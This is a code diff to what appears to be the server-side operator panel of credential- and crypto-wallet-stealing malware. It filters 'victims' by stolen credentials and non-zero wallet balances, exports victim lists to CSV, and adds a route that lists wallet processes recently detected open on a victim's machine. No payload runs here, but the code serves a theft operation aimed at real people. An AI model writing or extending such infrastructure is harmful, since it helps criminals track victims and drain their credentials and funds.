@@ -42,7 +42,7 @@ export function hasWhere(has: z.infer<typeof listQuery>['has']) {
     case 'creds':
       return { credentials: { some: {} } };
     case 'balances':
-      return { wallets: { some: { AND: [{ NOT: { balance: null } }, { NOT: { balance: '0' } }] } } };
+      return { wallets: { some: { balance: { not: null } } } };
     default:
       return {};
   }
@@ -149,6 +149,29 @@ export const victimRoutes: FastifyPluginAsync = async (app) => {
     reply.header('content-disposition', 'attachment; filename="victims.csv"');
     await audit(prisma, { operatorId: request.operator?.id, action: 'export.victims', entity: 'victim', ip: request.clientIp });
     return head + body;
+  });
+
+  app.get('/victims/:id/open-wallets', async (request) => {
+    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
+    const since = new Date(Date.now() - 60 * 60_000);
+    const closed = await prisma.event.findFirst({ where: { victimId: id, kind: 'wallet_closed', createdAt: { gte: since } }, orderBy: { createdAt: 'desc' }, select: { createdAt: true } });
+    const detected = await prisma.event.findMany({
+      where: { victimId: id, kind: 'wallet_detected', createdAt: { gte: closed?.createdAt ?? since } },
+      orderBy: { createdAt: 'desc' },
+      take: 40,
+      select: { createdAt: true, data: true }
+    });
+    const seen = new Set<number>();
+    const items = [];
+    for (const row of detected) {
+      const data = row.data as { name?: string; pid?: number; text?: string };
+      const pid = Number(data.pid ?? 0);
+      const name = String(data.name ?? data.text ?? '').replace(/^wallet detected:\s*/i, '').replace(/\s*\(\d+\)$/, '') || 'wallet';
+      if (pid && seen.has(pid)) continue;
+      if (pid) seen.add(pid);
+      items.push({ name, pid: pid || null, at: row.createdAt });
+    }
+    return { items: items.slice(0, 12) };
   });
 
   app.get('/victims/:id', async (request) => {
